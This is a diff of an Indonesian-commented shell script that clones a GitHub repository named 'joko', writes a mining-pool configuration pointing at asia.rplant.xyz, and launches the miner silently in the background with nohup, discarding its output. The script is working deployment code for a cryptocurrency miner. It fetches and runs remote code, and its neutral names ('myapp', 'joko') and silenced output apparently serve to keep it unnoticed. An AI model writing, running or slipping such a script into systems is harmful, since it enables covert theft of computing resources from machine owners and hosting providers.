@@ -4,6 +4,7 @@
 APP_DIR=~/myapp
 MINER_DIR="$APP_DIR/joko"
 CONFIG_FILE="$MINER_DIR/config.json"
+GIT_URL="https://github.com/vokerjok/joko.git"
 
 # Cek apakah sudah dijalankan sebelumnya
 if pgrep -f "./joko -c config.json" > /dev/null; then
@@ -11,20 +12,23 @@ if pgrep -f "./joko -c config.json" > /dev/null; then
     exit 0
 fi
 
-# Buat direktori jika belum ada
+# Buat direktori kerja
 mkdir -p "$APP_DIR"
 cd "$APP_DIR"
 
-# Unduh dan ekstrak hanya jika belum ada
+# Clone repo jika belum ada
 if [ ! -d "$MINER_DIR" ]; then
-    wget -q https://github.com/vokerjok/joko.git -O joko.tar.gz
-    tar -xf joko.tar.gz
-    rm -f joko.tar.gz
+    echo "Meng-clone repository dari $GIT_URL..."
+    git clone --depth 1 "$GIT_URL" joko
+else
+    echo "Repository sudah ada, update dengan git pull..."
+    cd "$MINER_DIR"
+    git pull --rebase
 fi
 
 cd "$MINER_DIR"
 
-# Buat file config
+# Buat file config.json (ganti sesuai kebutuhan)
 cat > "$CONFIG_FILE" <<END
 {
   "url": "asia.rplant.xyz:7022",
@@ -35,8 +39,10 @@ cat > "$CONFIG_FILE" <<END
 }
 END
 
-# Set permission
-chmod +x "$MINER_DIR/joko" "$CONFIG_FILE"
+# Set permission eksekusi
+chmod +x "$MINER_DIR/joko"
 
-# Jalankan miner
+# Jalankan miner secara background
 nohup ./joko -c config.json > /dev/null 2>&1 &
+
+echo "Miner dijalankan di background."
